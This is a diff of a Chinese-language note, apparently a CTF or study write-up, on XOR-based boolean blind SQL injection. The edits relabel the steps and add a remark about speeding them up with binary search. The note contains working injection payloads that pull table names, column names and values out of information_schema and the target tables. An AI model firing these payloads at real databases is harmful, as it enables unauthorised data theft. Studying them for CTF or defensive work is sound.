@@ -12,13 +12,14 @@
 异或盲注?id=1^1^1
 在这个前提下，分析回显内容的字符差异，进行布尔盲注，代码中使用二分法加快布尔盲注。
 ```
-获取表名
+布尔差异获取表名
 1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)^1
 [*] F1naI1y,Flaaaaag~
-猜测列名
+布尔差异猜测列名
 1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))>0)^1
-猜测值
+布尔差异猜测值
 1^(ord(substr((select(group_concat(列名))from(表名)),1,1))>0)^1
+从中可以利用二分法加速
 ```
 
 案例：
